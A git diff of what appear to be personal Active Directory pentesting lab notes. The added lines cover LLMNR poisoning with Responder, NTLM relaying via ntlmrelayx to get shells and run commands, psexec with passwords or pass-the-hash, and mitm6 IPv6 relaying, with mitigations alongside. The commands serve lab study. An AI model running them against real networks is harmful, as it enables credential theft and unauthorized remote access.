@@ -1,3 +1,5 @@
+
+- for impacket v 0.9.19 [reference](https://github.com/Dewalt-arch/pimpmykali)
 ## LLMNR Poisoning 
 - For [reference](https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/)
 - Used to identify hosts when DNS fails to do so
@@ -25,10 +27,10 @@
 	- `sudo mousepad /etc/responder/Responder.conf` SMB and HTTP off
 	- `sudo responder -I eth0 -dwP`
 	- Now we have to set up NTML relay
-		- `impacket-ntlmrelayx -tf targets.txt -smb2support` or 
-		- `impacket-ntlmrelayx -tf targets.txt -smb2support -i` -- i for interactive session 
+		- `ntlmrelayx.py -tf targets.txt -smb2support` or 
+		- `ntlmrelayx.py -tf targets.txt -smb2support -i` -- i for interactive session 
 		- after getting interactive session use `nc 127.0.0.1 1100`
-		- or `impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"` 
+		- or `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"` 
 - In lab try it on user-2
 ###### Mitigation
 - Enable SMB Signing on all devices
@@ -44,3 +46,34 @@
 	- Pro: Can prevent a lot of lateral movement
 	- Con: Potential increase in the amount of service desk tickets
 
+## Gaining Shell Access
+- using psexec in msf  --- we can do this with password or hashes (NT:LM)
+- `psexec.py marvel.local/ppark:'passw0rd@123'@10.0.2.14`
+- `psexec.py administrator@10.0.2.14 -hashes [hashes for administrator NT:LM]`
+- if psexec gets blocked you can use `wmiexec.py` or `smbexec.py`
+
+## IPV6 Attacks
+- `sudo mitm6 -d marvel.local`
+- Now we have to set up NTLMrelay (after setup run mitm6 cmd)
+	- `ntlmrelayx.py -6 -t ldaps://[Doman Controller IP] -wh fakewpad.marvel.local -l lootme` 
+###### Mitigation
+- IPV6 poisoning abuses the fact that Windows queries for an IPV6 address even in IPV4-only environments. If you do not use IPV6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPV6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
+	- (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPV6 (DHCPv6-In)
+	- (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
+	- (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPV6 (DHCPv6-Out)
+- If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
+- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP sigining an LDAP channel binding
+- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.
+
+## Passback Attack
+- [Reference](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
+
+## Initial Internal Attack Strategy
+- Begin day with mitm6 or Responder
+- Run scans to generate traffic
+- If scans are taking too long, look for websites in scope (http_version)
+- Look for default credentials on web logins
+	- Printers
+	- Jenkins
+	- Etc
+- Think outside the box
